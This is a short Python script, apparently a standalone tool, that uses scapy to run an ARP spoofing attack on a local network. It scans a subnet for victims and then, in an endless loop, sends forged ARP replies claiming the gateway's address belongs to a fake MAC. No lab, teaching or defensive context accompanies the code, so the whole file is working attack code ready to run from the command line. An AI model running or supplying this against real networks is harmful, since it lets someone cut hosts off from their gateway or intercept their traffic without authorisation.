import sys
from scapy.all import *
import util


def ARPAttack(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
    # [Important!]skip the gateway and host itself.
    victim_list = util.get_victim_in_local_network(ipprefix, mask_len)
    gateway = util.int_to_ip(util.ip_to_int(ipprefix)+1)
    request = 1
    while True:
        for victim in victim_list:
            arp = ARP(op=request, psrc=gateway, pdst=victim, hwsrc=mac)
            send(arp)

if __name__ == "__main__":
    ARPAttack(sys.argv[1], sys.argv[2])
